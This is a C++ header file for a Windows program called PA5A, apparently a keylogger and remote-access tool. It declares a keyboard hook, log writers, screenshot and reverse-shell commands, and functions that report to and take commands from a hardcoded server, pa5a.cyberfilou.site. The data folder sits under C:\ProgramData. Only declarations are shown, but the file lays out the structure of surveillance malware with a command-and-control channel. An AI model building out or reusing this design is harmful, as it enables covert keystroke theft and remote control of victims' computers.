#ifndef PA5A_HPP
#define PA5A_HPP

#include <Windows.h>
#include <WinInet.h>
#include <Psapi.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "cJSON/cJSON.hpp"
#include "utils.hpp"

#pragma comment(lib, "wininet")
EXTERN_C_START

struct CommandsToExecute
{
	BOOL keylogs;
	BOOL screenshot;
	BOOL reverse_shell;
};

//Pour afficher les informations de debogage
#define DEBUG

#define DATA_FOLDER_A "C:\\ProgramData\\PA5A"
#define DATA_FOLDER_W L"C:\\ProgramData\\PA5A"
#define SERVER_URL_A "pa5a.cyberfilou.site"
#define SERVER_URL_W L"pa5a.cyberfilou.site"

/********************************************************************************************************************************************************/
//main.cpp
INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow);
LRESULT CALLBACK WindowProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
/********************************************************************************************************************************************************/
//Keylogger.cpp
LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam);
VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode);
cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path);
VOID WriteJsonObjectLogs(cJSON* newJsonObject);
BOOL sendClientInformations(LPCSTR server, DWORD port);
/********************************************************************************************************************************************************/
int GetUuid(char* uuid);
struct CommandsToExecute GetCommands(LPCSTR server, DWORD port);

EXTERN_C_END

#endif // PA5A_HPP
